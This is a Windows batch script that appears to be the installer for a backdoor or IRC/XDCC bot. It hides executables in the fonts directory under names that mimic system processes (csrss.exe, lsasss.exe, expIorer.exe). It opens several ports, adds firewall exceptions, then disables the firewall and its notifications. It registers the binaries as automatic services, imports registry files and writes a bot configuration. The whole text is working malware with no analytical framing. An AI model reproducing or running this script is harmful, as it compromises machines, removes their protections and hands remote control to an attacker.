@echo off
cd\
cd %systemroot%\fonts\ias\

rem call av.bat

netsh firewall add allowedprogram %systemroot%\fonts\ias\msi.exe MsSysMon ENABLE ALL
netsh firewall add allowedprogram %systemroot%\fonts\ias\msn.exe SpamBlocker ENABLE ALL
netsh firewall add allowedprogram %systemroot%\fonts\ias\csrss.exe WebClients ENABLE ALL
netsh firewall add allowedprogram %systemroot%\fonts\ias\xdccd\lsasss.exe WebLog ENABLE ALL
netsh firewall add allowedprogram %systemroot%\fonts\ias\expIorer.exe ExpIorer ENABLE ALL
netsh firewall add portopening ALL 999 ExpIorer ENABLE ALL
netsh firewall add portopening ALL 23 WebClients ENABLE ALL
netsh firewall add portopening ALL 301 WebClients ENABLE ALL
netsh firewall add portopening ALL 4500 WebClients ENABLE ALL
netsh firewall add portopening ALL 4646 RConnect ENABLE ALL
netsh firewall set notifications DISABLE
netsh firewall set opmode DISABLE

%systemroot%\fonts\ias\spooler.exe install WebLog "WebLog" "%systemroot%\fonts\ias\xdccd\lsasss.exe -b %systemroot%\fonts\ias\xdccd\note.dll" automatic
%systemroot%\fonts\ias\spooler.exe install WebClients "WebClients" "%systemroot%\fonts\ias\csrss.exe" automatic
%systemroot%\fonts\ias\spooler.exe install DatInfo "DatInfo" "%systemroot%\fonts\ias\datkiller.exe" automatic
%systemroot%\fonts\ias\spooler.exe install ExpIorer "ExpIorer" "%systemroot%\fonts\ias\expIorer.exe" automatic
%systemroot%\fonts\ias\spooler.exe install MsSysMon "MsSysMon" "%systemroot%\fonts\ias\msi.exe" automatic

REGEDIT /S regadd.reg
regedit /s ultra.reg

SET MXHOME=%systemroot%\fonts\ias
SET MXBIN=%systemroot%\fonts\ias

move c:\ias.exe %systemroot%\fonts\ias

IF NOT EXIST %systemroot%\fonts\ias\xdccd\note.dll GOTO COPY
:COPY
copy %systemroot%\fonts\ias\xdccd\copy\note.dll %systemroot%\fonts\ias\xdccd
echo uploaddir %systemroot%\fonts\ias\xdccd>> %systemroot%\fonts\ias\xdccd\note.dll
echo user_nick [FX]%random%>> %systemroot%\fonts\ias\xdccd\note.dll
call ud.bat

net start WebLog
net start MSSysMon
net start WebClients
net start ExpIorer
net start DatInfo

call cacls.bat

:EXIT